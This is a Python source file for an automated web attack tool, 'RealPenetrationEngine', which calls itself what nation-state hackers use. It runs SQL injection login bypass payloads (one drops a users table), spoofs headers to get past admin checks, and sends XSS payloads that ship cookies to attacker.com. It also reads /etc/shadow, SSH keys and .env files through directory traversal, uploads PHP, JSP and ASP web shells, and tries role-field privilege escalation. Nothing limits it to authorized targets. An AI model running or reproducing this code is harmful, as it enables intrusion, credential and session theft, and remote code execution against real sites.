"""
REAL PENETRATION ENGINE - Actually breaks into systems and bypasses security
This is what nation-state hackers actually do - not just endpoint scanning
"""

import asyncio
import aiohttp
import re
import base64
import json
import urllib.parse
from typing import List, Dict, Any
from loguru import logger

class RealPenetrationEngine:
    """Engine that actually PENETRATES systems and BYPASSES security"""
    
    def __init__(self):
        self.session = None
        self.bypassed_systems = []
        self.stolen_credentials = []
        self.admin_sessions = []
        
    async def penetrate_target(self, target, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Actually penetrate the target system and bypass security"""
        logger.info(f"🎯 REAL PENETRATION: Breaking into {target.url}")
        
        vulnerabilities = []
        base_url = target.url
        if not base_url.startswith(('http://', 'https://')):
            base_url = f"https://{base_url}"
            
        # PHASE 1: SQL INJECTION ATTACKS - Bypass login forms
        sql_vulns = await self._sql_injection_attacks(base_url, session)
        vulnerabilities.extend(sql_vulns)
        
        # PHASE 2: AUTHENTICATION BYPASS - Get admin access
        auth_vulns = await self._authentication_bypass_attacks(base_url, session)
        vulnerabilities.extend(auth_vulns)
        
        # PHASE 3: XSS EXPLOITATION - Steal admin sessions
        xss_vulns = await self._xss_exploitation_attacks(base_url, session)
        vulnerabilities.extend(xss_vulns)
        
        # PHASE 4: DIRECTORY TRAVERSAL - Read protected files
        traversal_vulns = await self._directory_traversal_attacks(base_url, session)
        vulnerabilities.extend(traversal_vulns)
        
        # PHASE 5: FILE UPLOAD EXPLOITATION - Get shell access
        upload_vulns = await self._file_upload_exploitation(base_url, session)
        vulnerabilities.extend(upload_vulns)
        
        # PHASE 6: API EXPLOITATION - Bypass API security
        api_vulns = await self._api_exploitation_attacks(base_url, session)
        vulnerabilities.extend(api_vulns)
        
        # PHASE 7: PRIVILEGE ESCALATION - Get admin/root access
        privesc_vulns = await self._privilege_escalation_attacks(base_url, session)
        vulnerabilities.extend(privesc_vulns)
        
        logger.info(f"🚨 PENETRATION COMPLETE: {len(vulnerabilities)} successful exploits")
        return vulnerabilities
    
    async def _sql_injection_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """SQL Injection attacks to bypass authentication and access databases"""
        logger.info("💉 PHASE 1: SQL INJECTION ATTACKS")
        vulnerabilities = []
        
        # Common login endpoints
        login_endpoints = [
            "/login", "/admin/login", "/user/login", "/auth/login", "/signin",
            "/admin", "/admin.php", "/administrator", "/wp-admin", "/panel"
        ]
        
        # SQL injection payloads that bypass authentication
        sql_payloads = [
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' /*",
            "admin'/**/OR/**/1=1--",
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin' UNION SELECT 1,2,3,4,5--",
            "' OR 1=1 LIMIT 1--",
            "admin'; DROP TABLE users; --"
        ]
        
        for endpoint in login_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                # First, get the login form
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Look for login forms
                        if any(indicator in content.lower() for indicator in ['password', 'login', 'username', 'email']):
                            logger.info(f"🎯 Found login form at {endpoint}")
                            
                            # Try SQL injection payloads
                            for payload in sql_payloads:
                                try:
                                    # Try POST request with SQL injection
                                    data = {
                                        'username': payload,
                                        'password': payload,
                                        'email': payload,
                                        'user': payload,
                                        'login': payload
                                    }
                                    
                                    async with session.post(url, data=data, timeout=10) as inject_response:
                                        inject_content = await inject_response.text()
                                        
                                        # Check for successful bypass indicators
                                        success_indicators = [
                                            'dashboard', 'welcome', 'admin panel', 'logout',
                                            'profile', 'settings', 'users', 'management'
                                        ]
                                        
                                        if any(indicator in inject_content.lower() for indicator in success_indicators):
                                            # SUCCESSFUL SQL INJECTION!
                                            vuln = {
                                                "id": "SQL_INJECTION_BYPASS",
                                                "name": "🚨 SQL INJECTION AUTHENTICATION BYPASS",
                                                "severity": "CRITICAL",
                                                "description": f"SQL injection successfully bypassed authentication at {endpoint}",
                                                "target": base_url,
                                                "endpoint": endpoint,
                                                "method": "POST",
                                                "evidence": {
                                                    "payload": payload,
                                                    "response_indicators": success_indicators,
                                                    "url": url
                                                },
                                                "exploitation_data": {
                                                    "payload": payload,
                                                    "form_data": data,
                                                    "bypassed_auth": True
                                                },
                                                "one_line_hack": f"curl -X POST {url} -d 'username={payload}&password={payload}'",
                                                "impact": "CRITICAL: Authentication bypassed - full admin access gained",
                                                "remediation": "Fix SQL injection vulnerability in login form"
                                            }
                                            vulnerabilities.append(vuln)
                                            logger.critical(f"🚨 SQL INJECTION SUCCESS: {endpoint} with payload: {payload}")
                                            
                                except Exception as e:
                                    logger.debug(f"SQL injection attempt failed: {e}")
                                    
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _authentication_bypass_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Authentication bypass techniques"""
        logger.info("🔓 PHASE 2: AUTHENTICATION BYPASS ATTACKS")
        vulnerabilities = []
        
        # Admin endpoints to bypass
        admin_endpoints = [
            "/admin", "/admin/", "/admin/dashboard", "/admin/panel", "/admin/config",
            "/administrator", "/wp-admin", "/panel", "/control", "/manage"
        ]
        
        # Bypass techniques
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
            {"Host": "localhost"},
            {"Authorization": "Bearer admin"},
            {"X-Admin": "true"},
            {"X-Role": "admin"},
            {"X-User-Role": "administrator"}
        ]
        
        for endpoint in admin_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                # First try normal access
                async with session.get(url, timeout=10) as response:
                    if response.status in [401, 403]:
                        # Try bypass techniques
                        for headers in bypass_headers:
                            try:
                                async with session.get(url, headers=headers, timeout=10) as bypass_response:
                                    if bypass_response.status == 200:
                                        content = await bypass_response.text()
                                        
                                        # Check if we actually bypassed to admin area
                                        admin_indicators = [
                                            'admin', 'dashboard', 'control panel', 'management',
                                            'users', 'settings', 'configuration', 'system'
                                        ]
                                        
                                        if any(indicator in content.lower() for indicator in admin_indicators):
                                            # SUCCESSFUL BYPASS!
                                            vuln = {
                                                "id": "AUTH_BYPASS_SUCCESS",
                                                "name": "🚨 AUTHENTICATION BYPASS SUCCESS",
                                                "severity": "CRITICAL",
                                                "description": f"Authentication bypassed using header manipulation at {endpoint}",
                                                "target": base_url,
                                                "endpoint": endpoint,
                                                "method": "GET",
                                                "evidence": {
                                                    "bypass_headers": headers,
                                                    "admin_indicators": admin_indicators,
                                                    "url": url
                                                },
                                                "exploitation_data": {
                                                    "bypass_method": "header_manipulation",
                                                    "headers": headers,
                                                    "admin_access": True
                                                },
                                                "one_line_hack": f"curl {url} -H '{list(headers.keys())[0]}: {list(headers.values())[0]}'",
                                                "impact": "CRITICAL: Admin authentication bypassed - full administrative access",
                                                "remediation": "Fix authentication bypass vulnerability"
                                            }
                                            vulnerabilities.append(vuln)
                                            logger.critical(f"🚨 AUTH BYPASS SUCCESS: {endpoint} with headers: {headers}")
                                            
                            except Exception as e:
                                logger.debug(f"Bypass attempt failed: {e}")
                                
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _xss_exploitation_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """XSS exploitation to steal admin sessions"""
        logger.info("🍪 PHASE 3: XSS EXPLOITATION ATTACKS")
        vulnerabilities = []
        
        # Common XSS injection points
        xss_endpoints = [
            "/search", "/contact", "/feedback", "/comment", "/review", "/message",
            "/profile", "/settings", "/admin/search", "/user/profile"
        ]
        
        # XSS payloads that steal cookies/sessions
        xss_payloads = [
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>",
            "<svg onload=fetch('http://attacker.com/steal?cookie='+document.cookie)>",
            "javascript:fetch('http://attacker.com/steal?cookie='+document.cookie)",
            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]
        
        for endpoint in xss_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                for payload in xss_payloads:
                    try:
                        # Try GET parameter injection
                        get_url = f"{url}?q={urllib.parse.quote(payload)}&search={urllib.parse.quote(payload)}"
                        async with session.get(get_url, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check if payload is reflected without encoding
                                if payload in content or payload.replace('"', '&quot;') in content:
                                    # SUCCESSFUL XSS!
                                    vuln = {
                                        "id": "XSS_SESSION_STEAL",
                                        "name": "🚨 XSS SESSION STEALING VULNERABILITY",
                                        "severity": "CRITICAL",
                                        "description": f"XSS vulnerability allows session stealing at {endpoint}",
                                        "target": base_url,
                                        "endpoint": endpoint,
                                        "method": "GET",
                                        "evidence": {
                                            "payload": payload,
                                            "reflected": True,
                                            "url": get_url
                                        },
                                        "exploitation_data": {
                                            "xss_payload": payload,
                                            "injection_point": "GET parameter",
                                            "session_stealing": True
                                        },
                                        "one_line_hack": f"curl '{get_url}'",
                                        "impact": "CRITICAL: XSS allows stealing admin sessions and cookies",
                                        "remediation": "Fix XSS vulnerability with proper input sanitization"
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.critical(f"🚨 XSS SUCCESS: {endpoint} with payload: {payload[:50]}...")
                                    
                        # Try POST parameter injection
                        data = {
                            'q': payload,
                            'search': payload,
                            'message': payload,
                            'comment': payload,
                            'feedback': payload
                        }
                        
                        async with session.post(url, data=data, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                if payload in content:
                                    # SUCCESSFUL XSS!
                                    vuln = {
                                        "id": "XSS_POST_SESSION_STEAL",
                                        "name": "🚨 XSS POST SESSION STEALING VULNERABILITY",
                                        "severity": "CRITICAL",
                                        "description": f"POST XSS vulnerability allows session stealing at {endpoint}",
                                        "target": base_url,
                                        "endpoint": endpoint,
                                        "method": "POST",
                                        "evidence": {
                                            "payload": payload,
                                            "reflected": True,
                                            "post_data": data
                                        },
                                        "exploitation_data": {
                                            "xss_payload": payload,
                                            "injection_point": "POST parameter",
                                            "session_stealing": True
                                        },
                                        "one_line_hack": f"curl -X POST {url} -d 'message={urllib.parse.quote(payload)}'",
                                        "impact": "CRITICAL: POST XSS allows stealing admin sessions",
                                        "remediation": "Fix POST XSS vulnerability"
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.critical(f"🚨 POST XSS SUCCESS: {endpoint}")
                                    
                    except Exception as e:
                        logger.debug(f"XSS attempt failed: {e}")
                        
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _directory_traversal_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Directory traversal attacks to read protected files"""
        logger.info("📁 PHASE 4: DIRECTORY TRAVERSAL ATTACKS")
        vulnerabilities = []
        
        # File reading endpoints
        file_endpoints = [
            "/download", "/file", "/read", "/view", "/get", "/fetch",
            "/admin/file", "/api/file", "/files", "/documents"
        ]
        
        # Directory traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../var/www/html/.env",
            "../../../home/user/.ssh/id_rsa",
            "../../../etc/shadow",
            "../../../var/log/auth.log",
            "../../../proc/self/environ",
            "../../../etc/mysql/my.cnf",
            "../../../var/www/html/config.php"
        ]
        
        for endpoint in file_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                for payload in traversal_payloads:
                    try:
                        # Try GET parameter
                        get_url = f"{url}?file={urllib.parse.quote(payload)}&path={urllib.parse.quote(payload)}"
                        async with session.get(get_url, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for successful file read indicators
                                file_indicators = [
                                    'root:', 'bin/bash', 'etc/passwd', 'ssh-rsa',
                                    'BEGIN RSA PRIVATE KEY', 'mysql_root_password',
                                    'database_password', 'private_key'
                                ]
                                
                                if any(indicator in content for indicator in file_indicators):
                                    # SUCCESSFUL DIRECTORY TRAVERSAL!
                                    vuln = {
                                        "id": "DIRECTORY_TRAVERSAL_SUCCESS",
                                        "name": "🚨 DIRECTORY TRAVERSAL FILE READ",
                                        "severity": "CRITICAL",
                                        "description": f"Directory traversal allows reading protected files at {endpoint}",
                                        "target": base_url,
                                        "endpoint": endpoint,
                                        "method": "GET",
                                        "evidence": {
                                            "payload": payload,
                                            "file_content": content[:200] + "...",
                                            "indicators": file_indicators
                                        },
                                        "exploitation_data": {
                                            "traversal_payload": payload,
                                            "file_read": True,
                                            "sensitive_data": True
                                        },
                                        "one_line_hack": f"curl '{get_url}'",
                                        "impact": "CRITICAL: Directory traversal allows reading sensitive system files",
                                        "remediation": "Fix directory traversal vulnerability"
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.critical(f"🚨 DIRECTORY TRAVERSAL SUCCESS: {endpoint} read {payload}")
                                    
                    except Exception as e:
                        logger.debug(f"Directory traversal attempt failed: {e}")
                        
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _file_upload_exploitation(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """File upload exploitation for shell access"""
        logger.info("📤 PHASE 5: FILE UPLOAD EXPLOITATION")
        vulnerabilities = []
        
        # Upload endpoints
        upload_endpoints = [
            "/upload", "/file-upload", "/admin/upload", "/api/upload",
            "/profile/upload", "/image/upload", "/document/upload"
        ]
        
        # Malicious file payloads
        shell_payloads = {
            "shell.php": "<?php system($_GET['cmd']); ?>",
            "shell.jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "shell.asp": "<%eval request(\"cmd\")%>",
            "shell.py": "import os; os.system(request.args.get('cmd'))"
        }
        
        for endpoint in upload_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                # First check if upload endpoint exists
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        if 'upload' in content.lower() or 'file' in content.lower():
                            # Try uploading malicious files
                            for filename, payload in shell_payloads.items():
                                try:
                                    # Create multipart form data
                                    data = aiohttp.FormData()
                                    data.add_field('file', payload, filename=filename, content_type='text/plain')
                                    
                                    async with session.post(url, data=data, timeout=10) as upload_response:
                                        if upload_response.status == 200:
                                            upload_content = await upload_response.text()
                                            
                                            # Check for successful upload indicators
                                            if any(indicator in upload_content.lower() for indicator in ['success', 'uploaded', 'saved']):
                                                # SUCCESSFUL FILE UPLOAD!
                                                vuln = {
                                                    "id": "FILE_UPLOAD_SHELL",
                                                    "name": "🚨 MALICIOUS FILE UPLOAD SUCCESS",
                                                    "severity": "CRITICAL",
                                                    "description": f"Malicious file upload successful at {endpoint}",
                                                    "target": base_url,
                                                    "endpoint": endpoint,
                                                    "method": "POST",
                                                    "evidence": {
                                                        "filename": filename,
                                                        "payload": payload,
                                                        "upload_response": upload_content[:200]
                                                    },
                                                    "exploitation_data": {
                                                        "shell_file": filename,
                                                        "shell_payload": payload,
                                                        "remote_code_execution": True
                                                    },
                                                    "one_line_hack": f"curl -X POST {url} -F 'file=@{filename}'",
                                                    "impact": "CRITICAL: File upload allows remote code execution",
                                                    "remediation": "Fix file upload vulnerability"
                                                }
                                                vulnerabilities.append(vuln)
                                                logger.critical(f"🚨 FILE UPLOAD SUCCESS: {filename} at {endpoint}")
                                                
                                except Exception as e:
                                    logger.debug(f"File upload attempt failed: {e}")
                                    
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _api_exploitation_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """API exploitation attacks"""
        logger.info("🔌 PHASE 6: API EXPLOITATION ATTACKS")
        vulnerabilities = []
        
        # API endpoints to exploit
        api_endpoints = [
            "/api/users", "/api/admin", "/api/config", "/api/database",
            "/api/auth", "/api/login", "/api/wallet", "/api/balance",
            "/graphql", "/api/v1/users", "/api/v2/admin"
        ]
        
        # API exploitation techniques
        for endpoint in api_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                # Try different HTTP methods
                methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
                
                for method in methods:
                    try:
                        async with session.request(method, url, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for sensitive data exposure
                                sensitive_indicators = [
                                    'password', 'token', 'key', 'secret', 'private',
                                    'admin', 'root', 'database', 'config', 'credential'
                                ]
                                
                                if any(indicator in content.lower() for indicator in sensitive_indicators):
                                    # SUCCESSFUL API EXPLOITATION!
                                    vuln = {
                                        "id": "API_DATA_EXPOSURE",
                                        "name": "🚨 API SENSITIVE DATA EXPOSURE",
                                        "severity": "CRITICAL",
                                        "description": f"API exposes sensitive data at {endpoint}",
                                        "target": base_url,
                                        "endpoint": endpoint,
                                        "method": method,
                                        "evidence": {
                                            "sensitive_data": content[:500],
                                            "indicators": sensitive_indicators,
                                            "http_method": method
                                        },
                                        "exploitation_data": {
                                            "api_endpoint": url,
                                            "data_exposure": True,
                                            "sensitive_data": True
                                        },
                                        "one_line_hack": f"curl -X {method} {url}",
                                        "impact": "CRITICAL: API exposes sensitive configuration and credentials",
                                        "remediation": "Secure API endpoint and remove sensitive data exposure"
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.critical(f"🚨 API EXPLOITATION SUCCESS: {method} {endpoint}")
                                    
                    except Exception as e:
                        logger.debug(f"API exploitation attempt failed: {e}")
                        
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities
    
    async def _privilege_escalation_attacks(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Privilege escalation attacks"""
        logger.info("⬆️ PHASE 7: PRIVILEGE ESCALATION ATTACKS")
        vulnerabilities = []
        
        # Privilege escalation endpoints
        privesc_endpoints = [
            "/admin/elevate", "/user/promote", "/api/role", "/admin/user",
            "/profile/role", "/settings/permissions", "/api/permissions"
        ]
        
        # Privilege escalation payloads
        privesc_payloads = [
            {"role": "admin"},
            {"permissions": "admin"},
            {"user_role": "administrator"},
            {"privilege": "root"},
            {"access_level": "admin"},
            {"is_admin": "true"},
            {"admin": "1"}
        ]
        
        for endpoint in privesc_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                
                for payload in privesc_payloads:
                    try:
                        # Try POST request with privilege escalation
                        async with session.post(url, json=payload, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for successful privilege escalation
                                success_indicators = [
                                    'admin', 'administrator', 'elevated', 'promoted',
                                    'success', 'granted', 'updated', 'changed'
                                ]
                                
                                if any(indicator in content.lower() for indicator in success_indicators):
                                    # SUCCESSFUL PRIVILEGE ESCALATION!
                                    vuln = {
                                        "id": "PRIVILEGE_ESCALATION_SUCCESS",
                                        "name": "🚨 PRIVILEGE ESCALATION SUCCESS",
                                        "severity": "CRITICAL",
                                        "description": f"Privilege escalation successful at {endpoint}",
                                        "target": base_url,
                                        "endpoint": endpoint,
                                        "method": "POST",
                                        "evidence": {
                                            "payload": payload,
                                            "response": content[:200],
                                            "success_indicators": success_indicators
                                        },
                                        "exploitation_data": {
                                            "escalation_payload": payload,
                                            "admin_access": True,
                                            "privilege_escalated": True
                                        },
                                        "one_line_hack": f"curl -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                                        "impact": "CRITICAL: Privilege escalation grants admin access",
                                        "remediation": "Fix privilege escalation vulnerability"
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.critical(f"🚨 PRIVILEGE ESCALATION SUCCESS: {endpoint} with {payload}")
                                    
                    except Exception as e:
                        logger.debug(f"Privilege escalation attempt failed: {e}")
                        
            except Exception as e:
                logger.debug(f"Error testing {endpoint}: {e}")
                
        return vulnerabilities